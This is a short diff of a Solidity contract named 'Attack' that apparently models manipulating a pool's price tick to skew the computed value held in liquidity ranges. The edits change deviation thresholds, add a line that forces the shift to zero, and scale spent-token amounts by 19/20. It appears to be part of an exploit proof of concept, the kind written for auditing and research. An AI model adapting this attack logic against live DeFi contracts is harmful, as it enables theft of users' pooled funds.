@@ -179,11 +179,12 @@ contract Attack {
         // } else {
         //     shift = 5 + (deviation - 50) / 2;
         // }
-        if (deviation <= 10) {
+        if (deviation <= 40) {
             shift = 1;
         } else {
-            shift = 1 + (deviation - 10) / 20;
+            shift = deviation / 40;
         }
+        shift = 0;
         if (isNegative) {
             return currentTick - int24(shift);
         } else {
@@ -222,8 +223,8 @@ contract Attack {
             {
                 (spentTokens[0], spentTokens[1]) = maxTvl(leftLowerTick, leftUpperTick, currentTick, deviatedTick, liquidity);
                 (uint256 amount0, uint256 amount1) = minTvl(leftLowerTick, leftUpperTick, currentTick, deviatedTick, liquidity);
-                spentTokens[0] -= amount0;
-                spentTokens[1] -= amount1;
+                spentTokens[0] -= amount0 * 19 / 20;
+                spentTokens[1] -= amount1 * 19 / 20;
             }
             {
                 (uint256 amount0, uint256 amount1) = maxTvl(rightLowerTick, rightUpperTick, currentTick, deviatedTick, liquidity);
